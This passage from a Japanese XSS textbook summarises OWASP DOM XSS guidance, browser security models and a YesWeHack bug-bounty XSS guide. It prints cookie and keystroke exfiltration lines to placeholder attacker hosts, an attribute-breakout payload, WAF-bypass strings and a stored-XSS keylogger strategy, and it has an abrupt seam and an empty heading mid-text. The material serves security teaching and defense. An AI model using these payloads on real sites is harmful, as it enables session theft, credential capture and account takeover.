> 出典: DOM-based XSS Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

### 11. モダンフレームワークの「危険な抜け道」——エンコーディングをフレームワークに任せても安心できない理由

React、Angular、Vue、Litのようなモダンフレームワークは、テンプレート内に埋め込んだ変数をデフォルトで自動的にHTMLエスケープします。これ自体はRule #1相当の保護を自動化してくれる優れた機能です。しかしチートシートは、各フレームワークが用意している「意図的にエスケープを無効化するAPI（エスケープハッチ）」の存在を注意喚起しています。

- Reactの`dangerouslySetInnerHTML`（名前の通り「危険であることを自覚しろ」という設計で、サニタイズが必須）
- Reactは`javascript:`や`data:`スキームのURLを安全に扱えない（`href`にユーザー入力のURLをそのまま渡すと、自動エスケープの対象外になる）
- Angularの`bypassSecurityTrustAs*`系関数群
- Litの`unsafeHTML`
- Polymerの`inner-h-t-m-l`や`htmlLiteral`

これらは名前からして「安全でない（unsafe/dangerous/bypass）」と明示されているにもかかわらず、レビュー不足や急いだ実装によって誤用されるケースが後を絶ちません。加えて、テンプレートインジェクション（テンプレート構文自体をユーザー入力で構成してしまう設計ミス）や、古いバージョンのまま放置されたプラグイン・コンポーネントも独立したリスク要因として挙げられています。「フレームワークを使っているから安全」という思い込みは禁物で、これらの抜け道の使用箇所を横断的に洗い出すことが、モダンなコードベースのXSSレビューにおける重点項目になります。

### 12. 多層防御——エンコーディングを補完する仕組み

出力エンコーディングは中核的な防御ですが、チートシートは「defense-in-depth（多層防御）」として以下の補完策を挙げ、それぞれの限界も率直に述べています。

**Cookie属性**：`HttpOnly`や`Secure`のような属性は、JavaScriptからのCookieアクセスや平文送信を制限しますが、「XSSの実行そのものを防ぐわけではない」と明記されています。あくまで、XSSが発生してしまった場合の被害（セッションハイジャックなど）を軽減する策です。

**Content Security Policy（CSP）**：「CSPは多層防御の技法として使われたときに最も効果を発揮する」「アプリケーションごとに個別にカスタマイズされるべき」とされています。逆に、組織全体に一律のCSPポリシーを機械的に適用するアプローチには警鐘が鳴らされています。レガシーアプリケーションを壊してしまい、結果的に例外だらけの骨抜きなポリシーになりがちだからです。

**Trusted Types**（Chromiumベースのブラウザ）：

```
Content-Security-Policy: require-trusted-types-for 'script'
```

このヘッダーを設定すると、`innerHTML`のようなDOM XSSシンクに生の文字列を直接代入することがブラウザレベルで拒否されるようになります。文字列を代入する前に、あらかじめ登録された「ポリシー」（例えばDOMPurifyでサニタイズしてから`TrustedHTML`オブジェクトを生成するポリシー）を経由することが強制されるため、開発者がうっかり未サニタイズの文字列を`innerHTML`に代入してしまうミスを、実行時にブロックできます。これはDOM-based XSSに対する近年（2020年代以降、Chromeで導入）のブラウザネイティブな防御機構として、後の章でも取り上げます。

**Webアプリケーションファイアウォール（WAF）**：チートシートは明確に「WAFはXSS防止には推奨されない。特にDOM-based XSSに対しては」と述べています。理由は、WAFがサーバーとクライアントの間の通信を検査する仕組みである以上、クライアントサイドだけで完結するDOM-based XSS（サーバーへのリクエストを介さずにJavaScriptがブラウザ内で未信頼データをシンクに渡してしまうケース）を原理的に見ることができないためです。

### 13. アンチパターン：HTTPインターセプタ／フィルタによる一括エンコーディング

チートシートは、リクエストやレスポンスをまとめて検査・書き換えする「インターセプタ／フィルタ」方式のXSS対策についても、明確に非推奨としています。理由は4つに整理されています。

1. **コンテキストを認識できない**：フィルタは、あるパラメータがHTML本文に出力されるのか、JavaScriptやCSSに出力されるのかを判別できません。前述の通り、コンテキストが違えば必要なエンコーディングも異なるため、コンテキストを知らずに行うエンコーディングは的外れになりがちです。
2. **不適切・二重エンコーディングによる表示崩れ**：たとえば`O'Hara`のような正当な入力が`O\\'Hara`のように意図せず変換されてしまう、といった実害が生じます。
3. **DOM-based XSSには無力**：フィルタはサーバー・クライアント間のHTTPレスポンスの中身は見られても、クライアント側のJavaScript実行中に動的に構築されるDOM操作までは検査できません。
4. **外部データソースを見落とす**：内部REST APIやデータベースから読み込まれた、まだ報告されていない脆弱性を含むデータについては、そもそもフィルタの検査対象外になりがちです。

そして皮肉を込めてこう締めくくられています。「もしインターセプタ／フィルタをXSS対策として導入することが本当に有用なのであれば、すべての商用WAFに組み込まれ、OWASPが推奨しているはずではないか（If deploying interceptors/filters as an XSS defense was useful, don't you think it would be incorporated into all commercial WAFs and recommended by OWASP?）」。

### 14. 本節のまとめと、次節へのつながり

OWASPのチートシートが一貫して伝えているのは、次の3点に集約されます。

1. **出力エンコーディングは「コンテキストに応じて」選ばなければならない**。HTML本文、HTML属性、JavaScript、CSS、URLはそれぞれ独立したパーサ規則を持ち、あるコンテキスト用のエンコードを別のコンテキストに流用すると防御は破綻する。
2. **エンコーディングでは救えない場所（危険なコンテキスト）がある**。構文要素そのものを動的に構成する設計は、そもそも避けるべきである。
3. **エンコーディング以外の層（安全なシンクの選択、サニタイズ、CSP、Trusted Types）を重ねることで、単一の実装ミスがそのまま致命的な脆弱性に直結しない設計にする**。

この「コンテキストごとのパーサの振る舞いの違い」という考え方は、次節以降で扱うmutation XSS（ブラウザのHTMLパーサ・シリアライザの往復によって、サニタイズ後には安全だったはずのマークアップが危険な形に「変異」してしまう現象）や、DOM-based XSSにおけるソース・シンク解析の土台になります。ここで整理した「Rule #1〜#5＋危険なコンテキスト」の枠組みを頭に入れておくことで、以降の章で登場する個々のバイパス技法が「どのルールの、どの前提を崩しているのか」を体系的に理解できるようになります。

この構造は、通常のアプリケーション開発の学び方と根本的に異なります。開発者は「動くコードを書く」ために必要な知識を積み上げていきますが、その過程で「なぜこの API は制限されているのか」「なぜブラウザはこの動作を許さないのか」という*境界条件*を意識する機会はほとんどありません。ところがセキュリティの世界では、まさにその境界条件――ブラウザやサーバーが「許可していない」はずの操作を、実装の隙間を突いてすり抜ける方法――こそが攻撃面になります。Beyond XSS はこの見えない領域に光を当てることを目的として書かれています。

### なぜ「XSS の教科書」の中で Beyond XSS を紹介するのか

この教科書（本書）自体も XSS を主題としていますが、XSS という脆弱性は単独で存在しているわけではありません。以下の3つの理由から、Beyond XSS 全体の地図を早い段階で押さえておくことには実務上の意味があります。

**第一に、XSS の「防御」と「防御回避」は、そのまま第2章以降の独立した専門領域になっているためです。** 例えば CSP は XSS の被害を軽減するための代表的な防御機構ですが、CSP 自体にも数多くのバイパス手法があり、Trusted Types や Sanitizer API のような比較的新しい防御機構にも独自の回避テクニックが存在します。mXSS（Mutation XSS）はブラウザの HTML パーサーがサニタイズ後に文字列を「正規化」する過程で、一見安全に見えた文字列が危険な形に変異する現象であり、単に「タグをエスケープすればよい」という発想では防げません。これらは本書の中盤〜終盤の章で個別に深掘りしますが、その位置づけを理解するには、まず「XSS 対策には複数のレイヤーがあり、それぞれに固有の攻撃面がある」という全体像を知っておく必要があります。

**第二に、JavaScript の実行を伴わない攻撃（第3章の領域）が、しばしば XSS の入口や補助として使われるためです。** プロトタイプ汚染は、それ単体では画面に何かが表示されるわけではありませんが、アプリケーションの内部ロジックを歪め、結果として XSS に発展するケースが数多く報告されています。DOM Clobbering も同様に、`id` や `name` 属性を持つ HTML 要素がグローバル変数や DOM プロパティを「上書き」してしまう現象を悪用し、JavaScript の実行なしに `<script>` タグの読み込みを妨害したり、逆に意図しないコードパスを引き起こしたりします。これらは古典的な「reflected/stored XSS」の枠組みだけを学んだ読者には見落とされがちな攻撃経路です。

**第三に、XSS と隣接する「サイトをまたぐ攻撃」（第4章）や「サイドチャネル攻撃」（第5章の XSLeaks）は、しばしば XSS と組み合わせて初めて実害につながるためです。** 例えば、CSRF トークンを盗み出すために XSS を使う、あるいは XSS が使えない状況で XSLeaks を使ってユーザーの秘匿情報（ログイン状態、検索履歴の有無など)を一ビットずつ推測するといった手法は、いずれも脆弱性同士の連鎖（チェイン）としてバグバウンティレポートに頻出します。単一の脆弱性クラスだけを学んでいても、実際の攻撃シナリオを組み立てる力は身につきません。

### ブラウザのセキュリティモデルという「出発点」

Beyond XSS が第1章の冒頭に置いているのが「ブラウザのセキュリティモデル」の説明です。これは XSS そのものの技術ではありませんが、なぜ XSS がここまで深刻な脆弱性として扱われるのかを理解するための前提知識にあたります。

著者は、フロントエンドの実行環境が徹底して「ブラウザが提供する範囲」に閉じ込められていることを、3つの制限として整理しています。

1. **ローカルファイルへのアクセス禁止。** ウェブページ上の JavaScript は、ユーザーが `<input type="file">` などを通じて明示的に選択したファイル以外、ローカルディスク上のファイルを読み書きできません。`fetch('file:///etc/passwd')` のような呼び出しは、たとえコードとして書けても実行時にブロックされます。これは、悪意あるウェブサイトを開いただけでハードディスク上の SSH 鍵や設定ファイルが盗まれる事態を防ぐための、ブラウザの根本設計です。
2. **システム API 呼び出しの制限。** マイクやカメラへのアクセスのように、OS レベルの機能に触れる API は、ブラウザが明示的に提供し、かつユーザーが許可（パーミッションダイアログで同意）したものだけが使えます。ブラウザが対応するインターフェースを用意していない機能は、どれだけ JavaScript を工夫しても呼び出せません。
3. **他のオリジンのページへのアクセス禁止(同一オリジンポリシー、Same-Origin Policy）。** あるオリジン（スキーム・ホスト・ポートの組で決まる境界）で動いているスクリプトは、別オリジンのページの DOM やレスポンス内容を直接読み取ることができません。著者が挙げる具体例は分かりやすく、「`blog.huli.tw` 上で動くスクリプトが、同じブラウザで開いている Gmail のメール本文を読み取れてしまったら大惨事になる」という説明です。この原則があるからこそ、私たちは複数のタブで異なるサービスに同時にログインしていても安心していられます。

Chromium 系ブラウザではこの同一オリジンポリシーをプロセスレベルでさらに強化する「Site Isolation」という仕組みも導入されています。これは、異なるサイトのコンテンツを別々の OS プロセスに割り当てることで、たとえ JavaScript エンジン自体に脆弱性があっても、その影響を他サイトのデータ漏洩にまで波及させにくくする多層防御です。逆に言えば、ブラウザのレンダリングエンジンや JavaScript エンジン自体に重大な脆弱性(例えば著者が言及する CVE-2021-30632 のような V8 の脆弱性）が見つかった場合、この同一オリジンポリシーという「約束事」そのものを迂回され、任意コード実行(RCE)にまで発展するリスクがあります。CVE-2021-30632 は Google Chrome の V8 JavaScript エンジンに存在した Out-of-bounds write の脆弱性で、2021年に修正されました。この種の脆弱性は XSS とは別カテゴリ(ブラウザ自体のメモリ安全性の問題)ですが、「ブラウザが約束している境界を破る」という点で、フロントエンドセキュリティ全体の脅威モデルを理解する上で対比的に有用な例です。

> 出典: ブラウザのセキュリティモデル — https://aszx87410.github.io/beyond-xss/ja/ch1/browser-security-model/

XSS がなぜここまで深刻に扱われるのかは、このセキュリティモデルを踏まえると明確になります。XSS とは、本来「別オリジンのスクリプトは実行できない」はずのページ上で、攻撃者が用意した JavaScript を*そのページ自身のオリジンとして*実行させてしまう脆弱性です。つまり XSS は、同一オリジンポリシーという最も基本的な防御ラインを、ブラウザのバグではなくアプリケーション側の実装ミスによって内側から突破してしまう攻撃だと言えます。ブラウザがどれだけ堅牢にオリジン間の分離を実装していても、アプリケーションが「信頼すべきでない入力」をスクリプトとして実行してしまえば、その分離は意味をなさなくなります。この構造を理解しておくと、後続の章で扱う「反射型 XSS」「格納型 XSS」「DOM based XSS」といった分類が、単なる用語の違いではなく、「攻撃者のスクリプトがどの経路を通ってページのオリジン内に持ち込まれるか」という一貫した視点で整理できるようになります。

### この教科書の中での Beyond XSS の使い方

## YesWeHack XSS徹底ガイド

このセクションでは、フランスのバグバウンティプラットフォーム **YesWeHack** が公開している実務者向け記事「*Cross-Site Scripting (XSS) Attacks & Exploitation: The Ultimate Guide*」を精読する。PortSwiggerの学習教材やOWASPのチートシートが「原理と分類」に軸足を置くのに対し、この記事は**バグバウンティハンター（脆弱性を発見して報告する側の実務者）が実際に手を動かすときの思考順序**――「どこで見つかるか」「どう検出するか」「見つけた後、影響をどう最大化するか」――に沿って書かれている点が特徴である。特に、**単なる `alert(1)` のポップアップで終わらせず、実際に被害者を害する具体的な悪用シナリオまで踏み込む**という姿勢は、報告書の説得力（＝深刻度評価やバウンティ額に直結する）を左右する実務的な視点として重要である。

### XSSとは何か、なぜ「中程度」評価では実態を見誤るのか

記事はまずXSSを次のように定義する。

> "Cross-Site Scripting (XSS), classed as CWE-79, refers to a class of security vulnerabilities in web applications where an attacker injects malicious JavaScript code into content that is delivered to users."
>（XSS、CWE-79に分類される脆弱性は、攻撃者が悪意あるJavaScriptコードをユーザーに配信されるコンテンツに注入する、Webアプリケーションのセキュリティ脆弱性の一群を指す。）

CWE（Common Weakness Enumeration）は「脆弱性の型」を分類する共通識別子の体系で、79番がXSSに割り当てられている。本質的な原因は一貫している――**アプリケーションがユーザー入力を、それが出力されるコンテキスト（HTML本文・属性・JavaScript文字列・URLなど）に応じて適切に検証・エスケープしていないこと**である。この「コンテキストに応じた」という点が実務上の落とし穴で、後述のDOM XSSの例のように、開発者が「エスケープしたつもり」でも出力先の文法（HTML属性としての解釈規則）を誤解していれば注入は成立してしまう。

CVSS（Common Vulnerability Scoring System、脆弱性の深刻度を数値化する業界標準）ベースの自動診断ツールやチェックリストは、XSSを機械的に「中程度（Medium）」に格付けしがちである。だが記事はこの評価を実務上の誤りだと指摘する。実際の到達点は次のように広い。

- **アカウント乗っ取り（Account Takeover, ATO）** ―― セッショントークンやCSRFトークンの窃取を通じて、被害者本人になりすます。
- **他ユーザーの機密データの改ざん** ―― 被害者の権限でAPIを呼び出し、設定やデータを書き換える。
- **稀なケースでの任意ファイル読み取りやリモートコード実行（RCE）** ―― 管理画面やElectronベースのデスクトップアプリなど、JavaScript実行がOS操作に直結する環境では、XSSがサーバーサイド／クライアントサイドの完全な侵害にまで発展しうる。

つまり「XSS＝中程度」という機械的な評価は、**攻撃者が最小努力（`alert(1)` の表示）で満足した場合の下限**にすぎず、悪用のシナリオ設計次第で深刻度は大きく跳ね上がる、というのがこの記事全体を貫くメッセージである。

### XSSの4つの主要タイプと、それぞれの「見つけ方・悪用の仕方」

記事はXSSを4分類し、それぞれについて **検出方法（Detection）** と **悪用メカニズム（Exploitation）** をセットで解説する。この「検出と悪用を分けて書く」構成自体が、バグバウンティの実務フロー（まず見つける→次に深刻度を上げる材料を作る）を反映している。

#### 1. リフレクテッド（Reflected）XSS

**検出方法**: 検索フォーム、ログインフォームのエラーメッセージ、URLパスパラメータなど、**ユーザーが入力しサーバーがその値をレスポンスにそのまま含めて返す箇所**で見つかる。「反射（reflect）」という名前の通り、入力が保存されずにその場のレスポンスに跳ね返ってくる点が特徴で、攻撃を成立させるには被害者に悪意あるリンクをクリックさせる必要がある（フィッシングとの組み合わせが前提になる）。

**基本ペイロード例**（セッションクッキーの窃取）:

```javascript
fetch(`//ATTACKER_SERVER/?data=${btoa(document.cookie)}`)
```

このコードが動く理由を分解する。`document.cookie` は、`HttpOnly` フラグ（後述）が付いていないクッキーをJavaScriptから読み取れるブラウザAPIである。`btoa()` はBase64エンコード関数で、クッキーの値に含まれうる `;` や空白、非ASCII文字を、URLのクエリパラメータとして安全に運べる形式に変換する。`fetch()` はプロトコル相対URL（`//` で始まり、現在のページと同じスキーム＝httpかhttpsを継承する）で攻撃者のサーバーにGETリクエストを送る。この一行だけで、被害者のブラウザに「自分のクッキーを外部に送信させる」ことができる。ここで注意すべきは、単純な `fetch()` はクロスオリジンでもリクエスト自体は送信される（CORSはレスポンスの**読み取り**を制限するのであって、送信自体は防がない）という点で、データを盗む側の攻撃者はレスポンスを読む必要がない（クエリパラメータとしてサーバーログに残ればよい）ため、CORSはこの攻撃の障害にならない。

**認証を要するリフレクテッドXSSの実例（複合攻撃のシナリオ）**

記事はより高度な悪用例として、次のようなエンドポイントを挙げている。

```
https://example.com/dashboard/UUID/search?query=XSS_PAYLOAD
```

このエンドポイントは**ログイン後**にしかアクセスできないダッシュボード内の検索機能で、`query` パラメータにXSSペイロードを注入できる。単体では「ログイン済みの被害者が、このURLを踏まないと発火しない」という制約があり悪用シナリオが弱く見える。しかし記事は、これを**別の脆弱性と連鎖させる**ことで実用的な攻撃に変える方法を示す。

前提として次の2つが必要になる。

1. **ログイン処理に対するCSRF（Cross-Site Request Forgery）脆弱性** ―― 攻撃者があらかじめ用意した認証情報（攻撃者自身のアカウント）で、被害者のブラウザに強制的にログインさせられること。CSRFトークンが存在しない、あるいは検証されていないログインフォームがあれば、攻撃者は被害者のブラウザ上で「攻撃者のアカウントとしてログインする」POSTリクエストを、被害者に気づかれずに送信させられる。
2. **ローカルエンドポイント（同一オリジン内のパス）へのリダイレクトを許可する機能** ―― ログイン成功後に、`?redirect=` のようなパラメータで遷移先を指定できる仕組み。

これらを組み合わせると、攻撃者は次のリンクを被害者に踏ませるだけで攻撃を完結できる。

1. 被害者がリンクをクリックすると、CSRFにより**攻撃者のアカウントで自動的にログイン**させられる。
2. ログイン完了後、`redirect` パラメータによって**攻撃者が用意したXSSペイロード付きの検索URL**（前述の `search?query=XSS_PAYLOAD`）へ自動遷移する。
3. XSSペイロードが（攻撃者のアカウントのセッション内で）実行される。

ここで疑問が浮かぶ――「攻撃者は自分のアカウントに攻撃者自身がログインしているだけでは？」という点だが、記事の狙いはその先にある。**XSSペイロード自体が、ページ上に偽のログインフォームをiframeやインラインHTMLとして描画し、被害者に「セッションが切れたので再ログインしてください」と信じ込ませて本物の認証情報を入力させる**、というフィッシングの土台としてXSSを使う。被害者は「見慣れたドメイン（example.com）上の、見慣れたUIのログインフォーム」に入力するため、疑うきっかけがほとんどない。これは**同一オリジン上で発生するフィッシングは、ブラウザのアドレスバー確認という一般的な防御策をすり抜ける**という、XSSとソーシャルエンジニアリングの組み合わせが持つ本質的な危険性を示す好例である。

#### 2. ストアド（Stored）XSS

**検出方法**: コメント欄、掲示板の投稿、チャットメッセージ、プロフィール欄など、**ユーザー入力がデータベースやファイルに永続的に保存され、後から（多くの場合、他のユーザーに対して）表示される箇所**で見つかる。

**危険性**: リフレクテッドXSSと違い、被害者に特別なリンクをクリックさせる必要がない。**該当ページを閲覧しただけの、無関係な第三者すべてが自動的に被害を受ける**ため、影響範囲がリフレクテッドより桁違いに広がりやすく、通常は高～クリティカルの深刻度に格付けされる。

**悪用戦略（「マルウェア型」アプローチ）**: 記事は、ストアドXSSを見つけたあとの悪用方針として、単発のペイロードではなく**持続的に動作する小さなマルウェアをJavaScriptで書く**アプローチを推奨する。手順は概ね次の通りである。

1. **リスナーを設置する** ―― `document.addEventListener` などでユーザーの操作（キー入力、クリック、フォーム送信）を継続的に監視するコードを仕込む。
2. **ページ全体を覆う不可視のiframeで被害者を「隔離」する** ―― 被害者の目には正規のページに見えるが、実際には攻撃者が制御するiframeがかぶさっており、被害者の入力を横取りできる状態を作る。
3. **キー入力、マウス位置、フォームへの応答をハイジャックする** ―― キーロガーとして機能させ、被害者が入力するパスワードや個人情報を収集する。
4. **収集したデータを画像タグ経由でサーバーへ送信する** ―― `new Image().src = "//attacker.com/log?d=" + data` のように、`<img>` タグのリクエストとしてデータを外部送信する。画像リクエストはCORSのプリフライト（事前確認）やContent-Typeの制約を受けにくく、多くのCSP設定でも見落とされがちな抜け穴になるため、**CORS制限を実質的に回避する定番の抽出（exfiltration）手法**として使われる。

この手法が有効な理由は、`<img src="...">` の読み込みが「単純リクエスト」としてブラウザに扱われ、JavaScriptからの `fetch`/`XMLHttpRequest` に課されるCORSのオリジンチェックの対象にならないためである（レスポンスをJavaScriptから読み取る必要がなく、送信できればよいので画像タグで十分機能する）。

#### 3. DOM XSS

**検出方法**: サーバーサイドのHTMLソースにはペイロードが一切現れず、**ブラウザ側のJavaScriptがDOM（Document Object Model、HTML文書をツリー構造として表現しJavaScriptから操作可能にする仕組み）を書き換える際に汚染される**ため、ネットワークタブやサーバーログを見ても気づけない。記事はブラウザの開発者ツール、および専用ツールである **DOM Invader**（Burp Suiteに内蔵されたDOM XSS検出支援機能。本教科書のセクション3で詳述）や **DOM Invaderのソース・シンク解析機能に相当するDOM Explorer**の利用を推奨している。

**脆弱なコード例**:

```javascript
document.body.innerHTML += "<a href='" + window.location.href + "'>Home</a>"
```

このコードの問題を仕組みレベルで説明する。`window.location.href` は現在のページのURL全体（攻撃者が自由に細工できる**ソース**＝汚染された入力の発生源）を返す。それを**エスケープなしで文字列連結し、`innerHTML` に代入**している。`innerHTML` への代入は、ブラウザのHTMLパーサーを**その場で再起動**させ、代入された文字列をHTMLとして構文解析させる（＝**シンク**、汚染データが危険な形で消費される地点）。したがって、URLの中に単一引用符 `'` を含む値を混入できれば、`href='...'` という属性値の文字列リテラルを**その場で終了**させ、後続の文字列を新しい属性やタグとして解釈させられる。

**悪用ペイロード**（URLのフラグメントやクエリに混入させる想定）:

```
x' oncontentvisibilityautostatechange=alert(1) style='display:block;content-visibility:auto
```

これが埋め込まれると、生成されるHTMLは次のようになる。

```html
<a href="x" oncontentvisibilityautostatechange="alert(1)" 
style="display:block;content-visibility:auto">Home</a>
```

このペイロードが機能する仕組みを段階的に見る。まず `x'` によって `href` 属性値を早期に閉じる。次に空白を挟んで新しい属性 `oncontentvisibilityautostatechange=alert(1)` を追加する――これは**CSS Content Visibilityの状態変化イベント**に紐づくイベントハンドラ属性で、比較的新しいブラウザAPI（`content-visibility` プロパティが要素の描画をスキップ可能にする仕組みに付随するイベント）であり、従来型のWAFやXSSフィルタの「危険なイベントハンドラのブラックリスト」（`onerror`, `onload`, `onclick` など定番のものだけを弾く実装）が**新しいイベントハンドラの存在を把握しておらず素通りさせてしまう**典型例になっている。最後に `style='display:block;content-visibility:auto'` で `content-visibility: auto` を指定し、要素が実際に可視化された際に状態変化イベントを発火させる引き金を作っている。記事が明記する通り、**この種のペイロードはブラウザの実装差により動作が変わりうる**（新しいCSS/HTML機能への対応状況がブラウザエンジンごとに異なるため）。この事実は、XSSフィルタやWAFのブラックリスト方式が**新しいHTML/CSS/JS機能が追加されるたびに原理的に後手に回る**という設計上の限界を示しており、ホワイトリスト方式（許可するタグ・属性のみを列挙する）や、そもそもユーザー入力をHTMLとして解釈させない設計（後述のサニタイズ）が優先されるべき理由になっている。

#### 4. ブラインド（Blind）XSS

**検出方法**: ペイロードを注入しても**攻撃者自身のブラウザでは実行結果が確認できない**――例えば「お問い合わせフォーム」に投稿した内容が、攻撃者には見えない**管理者用の承認待ちキュー画面**で表示されるようなケースである。このため検出には**OAST（Out-of-band Application Security Testing、帯域外テスト）**が用いられる。これは、ペイロードの中に攻撃者が管理する外部サーバーへのコールバック（例: `<script src="//attacker.oast.example/x.js"></script>`）を仕込んでおき、**いつ・誰の環境で・どのHTTPヘッダーとともに**そのURLへのリクエストが飛んできたかを監視することで、「ペイロードが後で誰かの画面で実行された」ことを間接的に検知する手法である（Burp CollaboratorやXSS Hunterなどのツールがこの役割を担う）。

**特徴**: 攻撃者の操作直後には何も起きず、**時間差・別コンテキストで（多くの場合、サポート担当者や管理者など高権限のユーザーの画面で）実行される**。この「発見しにくいが刺さったときの影響が大きい」性質から、記事は**スパイウェア型のマルウェア**（ストアドXSSと同様にキー入力やページ操作を監視・外部送信するコード）を仕込む戦略を提案しており、高権限ユーザーの管理画面操作を盗聴できればアカウント乗っ取りに直結する。

### XSSの防御とミティゲーション

記事は攻撃側の解説に続き、開発者・運用者側が取るべき対策も具体的なコード例つきで示している。バグバウンティハンターにとってもこれらは重要で、**どの対策が入っているか／入っていないかを見極めることが、脆弱性の悪用可能性と深刻度評価を判断する材料になる**。

#### 入力検証と出力エンコード（ホワイトリスト方式）

記事は、危険な文字を一つずつ排除する**ブラックリスト方式**ではなく、**許可する要素だけを列挙するホワイトリスト方式**を推奨する。Node.jsでの実装例として、`sanitize-html` ライブラリを用いたコードが示されている。

```javascript
const userInput = '<img src=x onerror=alert("XSS!")>';

const sanitizeHtml = require('sanitize-html');
const sanitizedOutput = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'img', 'strong'],
  allowedAttributes: {
    'img': ['src']
  }
});
```

この設定が安全な理由は、`allowedAttributes` で `img` タグに許可する属性を `src` のみに限定している点にある。`onerror` のようなイベントハンドラ属性はホワイトリストに含まれていないため、**入力に含まれていても構造ごと除去される**（ブラックリストのように「`onerror` という文字列だけを消す」実装だと、大文字小文字の変化や属性名の間に無意味な文字を挟む難読化で回避されうるのに対し、ホワイトリストは「許可リストにない属性はすべて落とす」ため、攻撃者が知らない新しいイベントハンドラ――前述の `oncontentvisibilityautostatechange` のような――が登場しても自動的に防げるという頑健性がある)。

#### コンテンツセキュリティポリシー（CSP）

CSP（Content Security Policy）は、HTTPレスポンスヘッダーでブラウザに対して「このページで実行してよいスクリプトの出所」などを宣言する仕組みである。Express.js（Node.jsのWebフレームワーク）でのミドルウェア実装例が示されている。

```javascript
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", 
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self'; " +
    "object-src 'none'; " +
    "base-uri 'self'; " +
    "frame-ancestors 'none'"
  );
  next();
});
```

各ディレクティブの意味を整理する。`script-src 'self'` は自サイト（同一オリジン）から配信されたスクリプトファイルのみ実行を許可し、インラインスクリプトや `eval()`（デフォルトでは `'unsafe-inline'`/`'unsafe-eval'` を指定しない限りブロックされる）を禁止する。これにより、攻撃者が `<script>alert(1)</script>` を注入できても**そのインラインスクリプトはブラウザによって実行が拒否される**。`object-src 'none'` は `<object>`/`<embed>` 経由でのプラグイン実行を禁止し、`base-uri 'self'` は `<base>` タグによる相対URL解決先の乗っ取り（第4章で扱うDOM Clobbering系の攻撃とも関連する）を防ぎ、`frame-ancestors 'none'` は自サイトが他サイトのiframeに埋め込まれること（クリックジャッキングの土台）を防ぐ。ただしCSPは**万能ではなく**、後の章（第4章 s4i「CSP is dead」相当のセクション）で扱うように、JSONPエンドポイントの許可や `'unsafe-inline'` の併用、あるいはプロトタイプ汚染やDOM Clobberingを用いたガジェットチェーンによって回避されうることが知られている点も念頭に置く必要がある。

#### セキュアなクッキーフラグ（HttpOnly）

記事は `HttpOnly` フラグの実装を推奨している。これはクッキーの発行時（`Set-Cookie` ヘッダー）に付与する属性で、付与されたクッキーは**JavaScriptの `document.cookie` から一切読み取れなくなる**（ブラウザのAPI仕様レベルで隠蔽される）。前述の最初のペイロード例（`fetch(...document.cookie...)`）は、対象クッキーに `HttpOnly` が付与されていれば**空文字列しか取得できず無力化される**。これはXSS自体を防ぐものではないが、**XSSが成立した場合の被害（セッション窃取）を局所化する多層防御（defense in depth）の代表例**である。

#### Webアプリケーションファイアウォール（WAF）

WAFはルールベースの検出、既知の攻撃パターンとの照合（シグネチャマッチング）、リクエストパターンの統計的分析、機械学習モデルによる異常検知などを組み合わせてXSSを含む攻撃をブロックする境界防御である。ただし、記事および補強資料として参照した同じくYesWeHackの「WAF Bypass」記事が指摘するように、**WAFは正規表現ベースの検出を採用していることが多く、原理的にバイパス可能**である。例えば `<.*on.*=.*>` のような単純な正規表現は、`.` が改行文字にマッチしないため `<img src=1%0aonerror=alert(1)>`（`%0a` は改行のURLエンコード）のように**ペイロードの途中に改行を挟むだけで検出をすり抜ける**。ベンダー別の弱点として、CloudFlareは改行や括弧の多重化（`(sleep((3)))`）・Base64エンコードに、Akamaiは二重URLエンコード（`%2522`）・複数行コメント・括弧前の空白挿入に、Airlockは引用符で囲んだペイロード（`"alert(1)"`）にそれぞれ弱いことが報告されている。ここで重要な注意点として、記事は**「WAFのバイパス」と「脆弱性そのものの悪用可能性」を混同してはならない**と釘を刺している――WAFを通過させることに成功しても、バックエンドのサニタイズが別途機能していれば攻撃は成立しない。バグバウンティの実務では、単純なペイロード（`<script>`など）から始めて対象システムの反応を観察し、得られた情報を元に段階的にペイロードを調整していく反復的なアプローチが推奨されている。

> 出典: WAF Bypass Guide — https://www.yeswehack.com/learn-bug-bounty/web-application-firewall-bypass

### 参考: xsstools ―― ペイロード開発を支援するフレームワーク

補強資料として、YesWeHackが公開しているGitHubリポジトリ **xsstools** も参照した。これは「ペイロードの記述を簡単にすることを目的としたXSS開発フレームワーク」であり、GPL-3.0ライセンスでバグバウンティ・ペネトレーションテスト・セキュリティ研究向けに公開されている。構成は次の4つのコンポーネントからなる。

- **Exfiltrators（データ抽出モジュール）** ―― `postMessage`、`fetch`（GET/POST）、`navigator.sendBeacon`、コンソール出力、`<img>` タグ、`<style>` タグ、iframeなど、**本文中で解説した「画像タグ経由の抽出」を含む複数の抽出経路**を選択的に利用できるようにする。
- **Payload生成ツール** ―― キーロガーの起動、API呼び出し、データの評価・抽出などの処理を**連鎖（チェーン）させて**一つのペイロードとして組み立てる機能。
- **Wrapper（難読化）** ―― Base64エンコード、テンプレートリテラル、画像読み込み、iframeなどを用いてペイロード自体を隠蔽する機能。前述のWAF回避（Base64エンコードなど）とも関連する。
- **ClickJacker** ―― クリックジャッキング攻撃（透明化したiframeを重ねて意図しないクリックを誘発する攻撃）を座標指定で自動化するモジュール。

このツールの存在自体が、本セクションで解説した「マルウェア型」の悪用戦略（リスナー設置・iframeによる隔離・データ抽出）が**バグバウンティの実務で定型化された作業パターン**であることを裏付けている。

> 出典: xsstools — https://github.com/yeswehack/xsstools

### まとめ ―― 「`alert(1)` の先」を書けるかどうか

記事は最後を次の一文で締めくくっている。

> "Now you know that there's more to XSS than putting 'alert(1)' in your cross-site scripting payloads, and that this ubiquitous security flaw can do a lot of damage – with the right payload and process."
>（XSSのペイロードに `alert(1)` を入れるだけがXSSではないこと、そして適切なペイロードとプロセスがあれば、この遍在する脆弱性が大きな被害をもたらしうることが分かっただろう。）

